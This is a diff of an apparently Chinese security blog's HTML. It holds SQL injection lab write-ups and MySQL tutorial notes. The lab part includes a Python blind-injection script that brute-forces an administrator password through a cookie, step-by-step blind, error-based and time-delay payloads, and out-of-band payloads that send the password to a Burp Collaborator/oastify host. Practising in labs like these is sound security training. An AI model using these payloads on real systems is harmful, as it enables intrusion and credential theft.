LENGTH(password)&gt;<span class="subst">&#123;i&#125;</span>)=&#x27;a&#x27; --+&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">        sleep(sleep_time)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password_length=i</span><br><span class="line">            <span class="keyword">return</span> password_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破某一用户名密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_by_user</span>(<span class="params">url,username,tablename,inject_id</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    password_length=get_password_length_by_user(url,username,tablename,inject_id)</span><br><span class="line">    <span class="keyword">for</span> password_index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length+<span class="number">1</span>):</span><br><span class="line">        ascii_low = <span class="number">32</span></span><br><span class="line">        ascii_high = <span class="number">128</span></span><br><span class="line">        ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> ascii_low &lt; ascii_high:</span><br><span class="line">            cookies = &#123;</span><br><span class="line">                <span class="string">&#x27;TrackingId&#x27;</span>: <span class="string">f&quot;<span class="subst">&#123;inject_id&#125;</span>&#x27; and ascii(substr((select password from <span class="subst">&#123;tablename&#125;</span> where username=&#x27;<span class="subst">&#123;username&#125;</span>&#x27;),<span class="subst">&#123;password_index&#125;</span>,1)) &gt; <span class="subst">&#123;ascii_mid&#125;</span>--+;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.request(url=url,method=method,cookies=cookies)</span><br><span class="line">            sleep(sleep_time)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Welcome back!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                ascii_low=ascii_mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ascii_high = ascii_mid</span><br><span class="line">            ascii_mid=(ascii_low+ascii_high)//<span class="number">2</span></span><br><span class="line">        result+=<span class="built_in">chr</span>(ascii_mid)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">password=get_password_by_user( url,username,tablename,TrackingId)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
 <p><font class="notice">其实，本题在爆破数据表时，也可以使用Python单独对表名中含有<code>user</code>的表进行爆破，但考虑实际情况，把所有的表名爆破出，容易获得更多的信息</font></p>
-<h2 id="Blind-SQL-injection-with-conditional-errors">Blind SQL injection with conditional errors</h2>
+<h2 id="带有条件错误的盲-SQL-注入">带有条件错误的盲 SQL 注入</h2>
+<p>Substring用法：你可以从指定偏移量开始，提取具有指定长度的字符串部分。需要注意的是，偏移量索引是从1开始计数的。以下每个表达式都将返回字符串 <code>ba</code>。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">数据库</th>
+<th style="text-align:left">语法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Oracle</td>
+<td style="text-align:left"><code>SUBSTR('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td style="text-align:left">Microsoft</td>
+<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td style="text-align:left">PostgreSQL</td>
+<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+<tr>
+<td style="text-align:left">MySQL</td>
+<td style="text-align:left"><code>SUBSTRING('foobar', 4, 2)</code></td>
+</tr>
+</tbody>
+</table>
 <p>跟上一题是非常类似的。讲一下原理</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、添加单引号收到错误</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加两个单引号错误消失</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;&#x27;</span></span><br><span class="line"><span class="string">3、确认是查询错误而不是其他类型错误。下列语句表明目标为Oracle 数据库</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;（错误）</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> dual)<span class="operator">||</span><span class="string">&#x27;（正确）</span></span><br><span class="line"><span class="string">4、验证users表存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">5、验证用户administrator存在</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">6、爆破密码长度</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span>§a§ <span class="keyword">THEN</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">7、爆破密码</span></span><br><span class="line"><span class="string">TrackingId=xyz&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> SUBSTR(password,§b§,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;§a§&#x27;</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">||</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>结果如下：</p>
 <p><img src="/posts/3b7c6011//image-20250316173050195.png" alt="image-20250316173050195"></p>
-<h2 id="Visible-error-based-SQL-injection">Visible error-based SQL injection</h2>
+<h2 id="基于可见错误的-SQL-注入-bool型SQL注入">基于可见错误的 SQL 注入(bool型SQL注入)</h2>
 <p>错误会返回到客户端</p>
 <p><img src="/posts/3b7c6011//image-20250316181656140.png" alt="image-20250316181656140"></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、天加一个引号，可以在web页面看到报错，并看到自己的cookie</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2、添加注释符不再报错</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">3</span>、添加错误的语句观察返回内容</span><br><span class="line">TrackingId<span class="operator">=</span>xxx<span class="string">&#x27; AND CAST((SELECT 1) AS int)--</span></span><br><span class="line"><span class="string">4、使用正确语句错误消失</span></span><br><span class="line"><span class="string">TrackingId=xxx&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"><span class="number">5</span>、泄露用户</span><br><span class="line">TrackingId<span class="operator">=</span>xxxx<span class="string">&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</span></span><br><span class="line"><span class="string">6、泄露密码</span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
 <p>我试了下面这个注入语句，但是没有得到想要的结果。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users where username=&#x27;</span>administrator<span class="string">&#x27;) AS int)--</span></span><br></pre></td></tr></table></figure>
 <p><img src="/posts/3b7c6011//image-20250316184013533.png" alt="image-20250316184013533"></p>
-<h2 id="Blind-SQL-injection-with-time-delays-and-information-retrieval">Blind SQL injection with time delays and information retrieval</h2>
+<h2 id="带有时间延迟和信息检索的盲-SQL-注入">带有时间延迟和信息检索的盲 SQL 注入</h2>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>延迟<span class="number">10</span>秒</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</span></span><br><span class="line"><span class="string">2.不延时</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="comment">--</span></span><br><span class="line"><span class="number">3.</span>延时，说明有administrator用户</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">4.延时，说明密码长度为20</span></span><br><span class="line"><span class="string">TrackingId=x&#x27;</span><span class="operator">%</span><span class="number">3</span>BSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span>LENGTH(password)<span class="operator">=</span><span class="number">20</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">10</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="number">5.</span>bp爆破</span><br><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,§b§,1)=&#x27;</span>§a§<span class="string">&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br></pre></td></tr></table></figure>
-<h2 id="Blind-SQL-injection-with-out-of-band-interaction">Blind SQL injection with out-of-band interaction</h2>
+<h2 id="带外交互的盲-SQL-注入">带外交互的盲 SQL 注入</h2>
 <p><img src="/posts/3b7c6011//image-20250320124609391.png" alt="image-20250320124609391"></p>
 <p><a href="http://k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com">k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com</a></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: TrackingId<span class="operator">=</span>Mf3GZbtHdrUPYCyR<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//k8tddk5vl36mmu8y9zj46y1zdqjk7ev3.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--; session=7HQmzle2kv8m9yAyiZADwZ8B64e6hGQp</span></span><br></pre></td></tr></table></figure>
 <p><img src="/posts/3b7c6011//image-20250320124746996.png" alt="image-20250320124746996"></p>
-<h2 id="Blind-SQL-injection-with-out-of-band-data-exfiltration">Blind SQL injection with out-of-band data exfiltration</h2>
+<h2 id="SQL盲注与带外数据渗出">SQL盲注与带外数据渗出</h2>
 <p>跟上边类似的</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
 <p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
-<h2 id="SQL-injection-with-filter-bypass-via-XML-encoding">SQL injection with filter bypass via XML encoding</h2>
-<p>XML绕过注入</p>
+<h2 id="通过-XML-编码绕过过滤器的-SQL-注入XML绕过注入">通过 XML 编码绕过过滤器的 SQL 注入XML绕过注入</h2>
 <p><img src="/posts/3b7c6011//image-20250320153828228.png" alt="image-20250320153828228"></p>
 <p><img src="/posts/3b7c6011//image-20250320153954704.png" alt="image-20250320153954704"></p>
 <p>本文参考：</p>
@@ -8660,15 +8841,18 @@ grep [yh]<br>
 </table>
 <h2 id="数据库、数据表的基本操作">数据库、数据表的基本操作</h2>
 <h3 id="数据库的基本操作">数据库的基本操作</h3>
-<p>查询数据库的版本：</p>
+<p>查询数据库的版本（敏感信息泄露）：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span> </span><br></pre></td></tr></table></figure>
 <p>MySQL安装完成后，要想将数据存储到数据库的表中，首先要创建一个数据库。创建数据库就是在数据库系统中划分一块空间存储数据，语法如下：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">创建数据库</span><br><span class="line"><span class="keyword">create</span> database 数据库名称;</span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建一个叫db1的数据库MySQL命令：</span><br><span class="line"><span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>创建数据库后查看该数据库基本信息MySQL命令：</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查询出MySQL中所有的数据库MySQL命令：</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>将数据库的字符集修改为gbk MySQL命令：</span><br><span class="line"><span class="keyword">alter</span> database db1 <span class="type">character</span> <span class="keyword">set</span> gbk;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>切换数据库 MySQL命令：</span><br><span class="line">use db1;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>查看当前使用的数据库 MySQL命令：</span><br><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>删除数据库MySQL命令：</span><br><span class="line"><span class="keyword">drop</span> database db1;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>退出数据库</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
 <h3 id="数据表的基本操作">数据表的基本操作</h3>
-<p>数据库创建成功后可在该数据库中创建数据表(简称为表)存储数据。请注意：在操作数据表之前应使用“USE 数据库名;”指定操作是在哪个数据库中进行先关操作，否则会抛出“No database selected”错误。 语法如下：</p>
+<p>数据库创建成功后可在该数据库中创建数据表(简称为表)存储数据。</p>
+<p><font class="notice">请注意：在操作数据表之前应使用“USE 数据库名;”指定操作是在哪个数据库中进行先关操作，否则会抛出“No database selected”错误。<br>字段首字符必须是字母或<code>_</code>，不能是数字或者其他字符</font></p>
+
+<p>语法如下：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">         字段<span class="number">1</span> 字段类型,</span><br><span class="line">         字段<span class="number">2</span> 字段类型,</span><br><span class="line">         …</span><br><span class="line">         字段n 字段类型</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><figcaption><span>表示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建学生表 MySQL命令：</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line"> birthday <span class="type">date</span></span><br><span class="line"> );</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>查看当前数据库中所有表</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查表的基本信息</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>查看表的字段信息</span><br><span class="line"><span class="keyword">desc</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student rename <span class="keyword">to</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>修改字段名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu change name sname <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>修改字段数据类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify sname <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>增加字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">add</span> address <span class="type">varchar</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>删除字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">drop</span> address;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>删除数据表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><figcaption><span>表示例</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建学生表 MySQL命令：</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">table</span> student(</span><br><span class="line"> id <span class="type">int</span>,</span><br><span class="line"> name <span class="type">varchar</span>(<span class="number">20</span>),</span><br><span class="line"> gender <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line"> birthday <span class="type">date</span></span><br><span class="line"> );</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>查看当前数据库中所有表</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查表的基本信息</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>查看表的字段信息</span><br><span class="line"><span class="keyword">desc</span> student;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> student rename <span class="keyword">to</span> stu;</span><br><span class="line">rename <span class="keyword">table</span> student <span class="keyword">to</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>修改字段名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu change name sname <span class="type">varchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>修改字段数据类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify sname <span class="type">int</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>增加字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">add</span> address <span class="type">varchar</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>删除字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu <span class="keyword">drop</span> address;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>删除数据表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> stu;</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span>修改字段a到字段b后(不知道括中号里可不可以)</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify 字段b [类型] after 字段a</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> stu modify 字段b [字段c 类型] after 字段a</span><br></pre></td></tr></table></figure>
 <h2 id="数据表的约束">数据表的约束</h2>
 <p>为防止错误的数据被插入到数据表，MySQL中定义了一些维护数据库完整性的规则；这些规则常称为表的约束。常见约束如下：</p>
 <table>
@@ -9046,7 +9230,7 @@ rows：返回具体行数。</strong></p>
 <p>举例：</p>
 <p>查询学生表中年纪最小的3位同学 MySQL命令：</p>
 <figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span> <span class="keyword">limit</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
-<p>表名盲注SQL爆破时的判断语句</p>
+<p>我写的某个Python脚本中表名盲注SQL爆破时的判断语句</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;ascii(substr((select table_name from information_schema.tables limit &#123;index&#125;,1),&#123;i&#125;,1)) &gt; &#123;mid&#125;--+</span></span><br></pre></td></tr></table></figure>
 <h3 id="使用GROUP-BY进行分组查询">使用GROUP BY进行分组查询</h3>
 <p>GROUP BY 子句可像切蛋糕一样将表中的数据进行分组，再进行查询等操作。换言之，可通俗地理解为：通过GROUP BY将原来的表拆分成了几张小表。</p>
